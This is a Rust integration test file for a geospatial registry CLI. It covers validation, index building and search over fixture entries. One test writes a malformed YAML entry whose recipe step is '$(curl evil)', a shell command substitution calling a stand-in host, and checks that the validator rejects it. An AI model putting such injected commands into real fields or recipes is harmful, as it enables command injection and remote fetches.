//! Integration test: run the real binary against a tiny fixture entries dir.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn manifest() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

fn fixture_entries() -> PathBuf {
    manifest().join("tests/fixtures/entries")
}

fn schema() -> PathBuf {
    manifest().join("../schema/entry.schema.json")
}

fn run(args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_geo-registry"))
        .args(args)
        .output()
        .expect("binary runs")
}

fn s(p: &Path) -> &str {
    p.to_str().unwrap()
}

fn copy_dir(src: &Path, dst: &Path) {
    for sub in ["data", "tools"] {
        fs::create_dir_all(dst.join(sub)).unwrap();
        for e in fs::read_dir(src.join(sub)).unwrap() {
            let p = e.unwrap().path();
            fs::copy(&p, dst.join(sub).join(p.file_name().unwrap())).unwrap();
        }
    }
}

#[test]
fn validate_build_and_search_fixture() {
    let entries = fixture_entries();
    let schema = schema();

    let out = run(&["validate", "--entries", s(&entries), "--schema", s(&schema)]);
    assert!(
        out.status.success(),
        "validate failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(String::from_utf8_lossy(&out.stdout).contains("4 entries"));

    let dist = tempfile::tempdir().unwrap();
    let out = run(&[
        "build",
        "--entries",
        s(&entries),
        "--schema",
        s(&schema),
        "--out",
        s(dist.path()),
    ]);
    assert!(
        out.status.success(),
        "build failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );

    let index: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(dist.path().join("index.json")).unwrap()).unwrap();
    // Operations stay out of `entries`, which Columbus servers read today.
    assert_eq!(index["count"], 3);
    assert_eq!(index["entries"].as_array().unwrap().len(), 3);
    assert!(index["entries"]
        .as_array()
        .unwrap()
        .iter()
        .all(|c| c["kind"] == "data" || c["kind"] == "tool"));
    assert_eq!(index["operations_count"], 1);
    assert_eq!(index["operations"][0]["id"], "buffer-fixture");
    assert_eq!(index["format_version"], 1);
    assert_eq!(index["entries"][0]["id"], "raster-fixture-tool");
    let data = index["entries"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["kind"] == "data")
        .unwrap();
    assert_eq!(data["region"], "Texas");
    assert_eq!(data["access_types"][0], "ept");

    let sha = fs::read_to_string(dist.path().join("index.sha256")).unwrap();
    assert!(sha.contains("  index.json\n") && sha.contains("  registry.sqlite\n"));

    let db = dist.path().join("registry.sqlite");
    let out = run(&["search", "lidar", "--db", s(&db)]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(out.status.success());
    // Name/summary hit outranks a notes-only hit on a retired entry.
    let first = text.find("texas-lidar-sample").expect("data hit");
    let second = text.find("vector-fixture-tool").expect("notes hit");
    assert!(first < second, "unexpected ranking:\n{text}");

    let out = run(&["search", "lidar", "--kind", "tool", "--db", s(&db)]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("vector-fixture-tool") && !text.contains("texas-lidar-sample"));

    let out = run(&["search", "raster", "--kind", "tool", "--db", s(&db)]);
    assert!(String::from_utf8_lossy(&out.stdout).contains("raster-fixture-tool"));

    // An unfiltered search (what Columbus does) never returns operations;
    // --kind operation finds them by name or by another name.
    let out = run(&["search", "buffer", "--db", s(&db)]);
    assert!(!String::from_utf8_lossy(&out.stdout).contains("buffer-fixture"));
    let out = run(&[
        "search",
        "proximity zone",
        "--kind",
        "operation",
        "--db",
        s(&db),
    ]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(
        text.contains("buffer-fixture") && text.contains("Columbus vector_op buffer"),
        "{text}"
    );

    let conn = rusqlite::Connection::open(&db).unwrap();
    let count: String = conn
        .query_row("SELECT value FROM meta WHERE key = 'count'", [], |r| {
            r.get(0)
        })
        .unwrap();
    assert_eq!(count, "3");
    let kinds: i64 = conn
        .query_row(
            "SELECT count(*) FROM entries WHERE kind NOT IN ('data', 'tool')",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(kinds, 0);
}

#[test]
fn validate_reports_bad_entries() {
    let dir = tempfile::tempdir().unwrap();
    copy_dir(&fixture_entries(), dir.path());
    // Broken reference, wrong id, disallowed recipe tool, code in a step.
    fs::write(
        dir.path().join("data/broken.yaml"),
        "id: not-broken\nkind: data\nname: B\npublisher: Unknown\nthemes: [x]\n\
         coverage: {region: Global}\nlicense: MIT\n\
         access: [{type: http, url: 'https://example.org', auth: none}]\n\
         recipe: {tool: shell, steps: ['$(curl evil)']}\n\
         related: [nope]\nstatus: active\nreview: {state: reviewed}\n",
    )
    .unwrap();
    let out = run(&[
        "validate",
        "--entries",
        s(dir.path()),
        "--schema",
        s(&schema()),
    ]);
    assert_eq!(out.status.code(), Some(1));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("broken.yaml"), "{err}");
    assert!(err.contains("does not match file name"), "{err}");
    assert!(err.contains("recipe.tool"), "{err}");
    assert!(err.contains("'nope' does not resolve"), "{err}");
}
